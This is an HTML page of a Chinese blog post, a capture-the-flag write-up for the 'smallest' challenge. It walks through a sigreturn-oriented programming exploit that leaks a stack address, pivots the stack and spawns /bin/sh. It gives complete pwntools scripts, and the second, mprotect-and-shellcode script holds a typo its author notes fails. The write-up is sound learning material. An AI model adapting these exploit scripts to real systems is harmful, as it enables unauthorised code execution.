@@ -1,0 +1,98 @@
+<!doctype html><html><head lang=en><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><title>BUU-360chunqiu2017_smallest-WP - blog of chuj</title><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="这篇博客写了两天，我也花了很久来理解srop，现在我可以说我会srop了。 这道题的代码非常短 xor rax, rax mov edx, 400h ; count mov rsi, rsp ; buf mov rdi, rax ; fd syscall ; LINUX - sys_read retn"><meta property="og:image" content><meta property="og:title" content="BUU-360chunqiu2017_smallest-WP"><meta property="og:description" content="这篇博客写了两天，我也花了很久来理解srop，现在我可以说我会srop了。 这道题的代码非常短 xor rax, rax mov edx, 400h ; count mov rsi, rsp ; buf mov rdi, rax ; fd syscall ; LINUX - sys_read retn"><meta property="og:type" content="article"><meta property="og:url" content="https://chujdk.github.io/wp/buu-360chunqiu2017_smallest-wp.html"><meta property="article:section" content="posts"><meta property="article:published_time" content="2020-11-28T10:28:00+00:00"><meta property="article:modified_time" content="2020-11-28T10:28:00+00:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="BUU-360chunqiu2017_smallest-WP"><meta name=twitter:description content="这篇博客写了两天，我也花了很久来理解srop，现在我可以说我会srop了。 这道题的代码非常短 xor rax, rax mov edx, 400h ; count mov rsi, rsp ; buf mov rdi, rax ; fd syscall ; LINUX - sys_read retn"><script src=https://chujdk.github.io/js/feather.min.js></script>
+<link href=https://chujdk.github.io/css/fonts.2c2227b81b1970a03e760aa2e6121cd01f87c88586803cbb282aa224720a765f.css rel=stylesheet><link rel=stylesheet type=text/css media=screen href=https://chujdk.github.io/css/main.ac08a4c9714baa859217f92f051deb58df2938ec352b506df655005dcaf98cc0.css><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.css><script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.js></script>
+<script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/contrib/auto-render.min.js onload=renderMathInElement(document.body)></script>
+<script>document.addEventListener("DOMContentLoaded",function(){renderMathInElement(document.body,{delimiters:[{left:"$$",right:"$$",display:!0},{left:"$",right:"$",display:!1}]})})</script><link rel=stylesheet type=text/css href=https://chujdk.github.io/css/font.e98a2c89163f90d6fa6d8baf5a50a6561f8ff3d0be1551265f364d138d75df33.css></head><body><div class=content><header><div class=main><a href=https://chujdk.github.io/>blog of chuj</a></div><nav><a href=/>Home</a>
+<a href=/posts.html>All posts</a>
+<a href=/about.html>About</a>
+<a href=/tags.html>Tags</a></nav></header><main><article><div class=title><h1 class=title>BUU-360chunqiu2017_smallest-WP</h1><div class=meta>Posted on Nov 28, 2020</div></div><section class=body><p>这篇博客写了两天，我也花了很久来理解srop，现在我可以说我会srop了。</p><p>这道题的代码非常短</p><pre class=wp-block-code><code>xor     rax, rax
+mov     edx, 400h       ; count
+mov     rsi, rsp        ; buf
+mov     rdi, rax        ; fd
+syscall                 ; LINUX - sys_read
+retn</code></pre><p>仅此六行。由于有syscall和一个read函数，我们可以通过改变read的字节数来控制rax的值，借此实现任意系统调用。于是我们的思路是先调用sys_write泄露栈地址，然后构造signal frame劫持rsp使栈迁移至一个<strong>可读写</strong>的<strong>确定</strong>空间（就是我们泄露的地址）。最后再构造一个signal frame指定execve的四个参数并设置系统调用号位execve的调用号，再注入“/bin/sh”，就获得了shell。</p><p>exp是这样，我们一段一段来看。</p><div class=wp-block-image><figure class="aligncenter size-large"><img src=https://www.cjovi.icu/usr/uploads/2020/11/QQ截图20201126221349.png alt class=wp-image-641></figure></div><div class=wp-block-image><figure class="aligncenter size-large"><img src=https://www.cjovi.icu/usr/uploads/2020/11/QQ截图20201126222323.png alt class=wp-image-642></figure></div><p>这句，说明read是直接从rsp读的，也就是说偏移为零。由于我在做的时候对栈行为感到了疑惑，这里我贴一下调试信息</p><figure class="wp-block-image size-large"><img src=https://www.cjovi.icu/usr/uploads/2020/11/QQ截图20201126222721.png alt class=wp-image-644></figure><figure class="wp-block-image size-large"><img src=https://www.cjovi.icu/usr/uploads/2020/11/QQ截图20201126222728.png alt class=wp-image-643></figure><p>这就可以很明显的看出来我们如何然后构造rop链了，我们先让程序再一次从头开始执行，然后输入一个字节，让rax被置为1，由于rdi由rax赋值，所以write的调用条件就成立了，通过下面的构造</p><pre class=wp-block-code><code>start_addr = 0x00000000004000B0                                 
+syscall_ret = 0x00000000004000BE                                
+start_void_rax_addr = 0x00000000004000B3                        
+                                                                
+payload = p64(start_addr) + p64(start_void_rax_addr) + p64(start_addr)
+sh.send(payload)  
+sleep(0.3)                           
+                                     
+sh.send('\xb3')                      
+stack_addr = u64(sh.recv()[0x148:0x148+8]) 
+print hex(stack_addr)                                                                      </code></pre><p>我们就可以实现泄露栈地址了。这里由两个细节要注意</p><ol><li>输入的那一个字节必须是\xb3，因为读入的时候会直接写到[rsp]处，而这里存的是该函数的返回地址。</li><li>stack_addr的赋值，我们知道栈中大概率会存一个可读可写的地址，但是这个位置在不同的机器上面可能是不同的，所以我碰到了在本地能打通而连远程（BUU）打不通的情况(<a href=https://www.cnblogs.com/Theffth-blog/p/12833123.html>感谢这位师傅</a>)。解决的方法是直接连接服务器，先对write泄露的栈空间分析</li></ol><div class=wp-block-image><figure class="aligncenter size-large"><img src=https://www.cjovi.icu/usr/uploads/2020/11/QQ截图20201126224554.png alt class=wp-image-647></figure></div><p>这个是可读写的。所以我们这么处理：<code>stack_addr = u64(sh.recv()[0x148:0x148+8])</code>，就可以获得一个可用的栈地址。</p><p>接下来我们再设置一次read，并劫持栈指针到stack_addr处实现栈迁移。代码如下</p><pre class=wp-block-code><code>sigframe = SigreturnFrame()                     
+sigframe.rax = constants.SYS_read               
+sigframe.rdi = 0                                
+sigframe.rdx = 0x400                            
+sigframe.rsi = stack_addr                       
+sigframe.rsp = stack_addr                       
+sigframe.rip = syscall_ret                      
+                                                
+payload = p64(start_addr) + 'sigretaa' + str(sigframe)
+sh.send(payload)                                
+sleep(0.3)                                            </code></pre><p><code>p64(start_addr) + 'sigretaa'</code>这里加的'sigretaa'是八个字节的垃圾数据，信号机制中，信号处理完，从内核态重新进入用户态的时候会pop一个sigreturn，而我们这里直接调用了这个系统调用，所以需要垃圾数据来去除这个pop的影响。</p><p>然后我们输入十五个字节，触发sigreturn</p><pre class=wp-block-code><code>trigger_sigret = p64(syscall_ret) + 'a'*7 
+sh.send(trigger_sigret)             
+sleep(0.3)                                </code></pre><p>执行到这里的时候就正式完成了栈迁移，之后我们只要伪造execve的signal frame并注入'/bin/sh'就可以拿shell了。</p><pre class=wp-block-code><code>sigframe = SigreturnFrame()                                                        
+sigframe.rax = constants.SYS_execve                                                
+sigframe.rsp = stack_addr                                                          
+sigframe.rsi = 0                                                                   
+sigframe.rdx = 0                                                                   
+sigframe.rdi = stack_addr + 0x150                                                  
+sigframe.rip = syscall_ret                                                         
+payload = (p64(start_addr) + 'sigretaa' + str(sigframe)).ljust(0x150,'a') + "/bin/sh\x00"
+sh.send(payload)                                                                   
+sleep(0.3)                                                                         
+sh.send(trigger_sigret)                                                            
+                                                                                   
+sh.interactive()                                                                         </code></pre><h4>另一种尝试</h4><p>然后我们再来思考一下，这道题是否有更好的方法。从服务器上面泄露出一个可用的地址并不容易，需要一次一次凑。但是，如果我们获得一个栈的大致位置，然后直接修改他的权限，就可以注入shellcode来拿shell了，这样就不需要试哪个地址是可用的了。所以我们可以考虑利用mprotect系统调用。</p><p>也就是说先用mprotect修改权限，此时先不劫持栈指针，然后用read劫持栈指针并注入shellcode，但是<strong>实际上仍然是难以实现的</strong>，我们在伪造mprotect的signal frame的时候，必然要指定一个stack address，我们手上有的仍然只是一个泄露的stack_addr，在mprotect执行结束后会ret，而ret时的rsp就是我们指定的rsp，这里仍然是需要我们凑的，所以我个人认为shellcode注入的意义不是很大。</p><pre class=wp-block-code><code>from pwn import *                                                   
+context(log_level = 'debug',arch = 'amd64',os = 'linux')            
+                                                                    
+sh = process("./smallest")                                          
+#sh = remote("node3.buuoj.cn","28646")                              
+                                                                    
+start_addr = 0x00000000004000B0                                     
+syscall_ret = 0x00000000004000BE                                    
+start_void_rax_addr = 0x00000000004000B3                            
+                                                                    
+payload = p64(start_addr) + p64(start_void_rax_addr) + p64(start_addr)  
+sh.send(payload)                                                    
+sleep(0.3)                                                          
+                                                                    
+sh.send('\xb3')                                                     
+stack_addr = u64(sh.recv()[8:16])                                   
+print hex(stack_addr)                                               
+                                                                    
+sigframe = SigreturnFrame()                                         
+sigframe.rax = constants.SYS_read                                   
+sigframe.rdi = 0                                                    
+sigframe.rdx = 0x400                                                
+sigframe.rsi = stack_addr                                           
+sigframe.rsp = stack_addr                                           
+sigframe.rip = syscall_ret                                          
+                                                                    
+paylaod = p64(start_addr) + 'sigretaa' + str(sigframe)              
+sh.send(payload)                                                    
+sleep(0.3)                                                          
+                                                                    
+trigger_sigret = p64(syscall_ret) + 'a'*7                           
+sh.send(trigger_sigret)                                             
+sleep(0.3)                                                          
+                                                                    
+sigframe = SigreturnFrame()                                         
+sigframe.rax = constants.SYS_mprotect                               
+sigframe.rdi = (stack_addr & 0xfffffffffffff000)                    
+sigframe.rsi = 0x1000                                               
+sigframe.rdx = 0x7                                                  
+sigframe.rip = syscall_ret                                          
+sigframe.rsp = stack_addr + 0x108                                   
+                                                                    
+payload = (p64(start_addr) + 'sigretaa' + str(sigframe)).ljust(0x108,'a') 
+payload += p64(stack_addr + 0x108 + 8)                              
+payload += asm(shellcraft.sh())                                     
+print payload                                                       
+sh.send(payload)                                                    
+sleep(0.3)        
+                  
+sh.send(trigger_sigret) 
+                  
+sh.interactive()        </code></pre><p>这个exp在我的本机上会出现错误，实在是看不出来有什么问题。</p></section><div class=post-tags><nav class="nav tags"><ul class=tags><li><a href=/tags/srop>srop</a></li></ul></nav></div></article></main><footer><div style=display:flex><a class=soc href=https://github.com/chujDK rel=me title=GitHub><i data-feather=github></i></a>
+<a class=border></a></div><div class=footer-info>2023 <a href=https://github.com/athul/archie>Archie Theme</a> | Built with <a href=https://gohugo.io>Hugo</a></div></footer><script>feather.replace()</script></div></body></html>
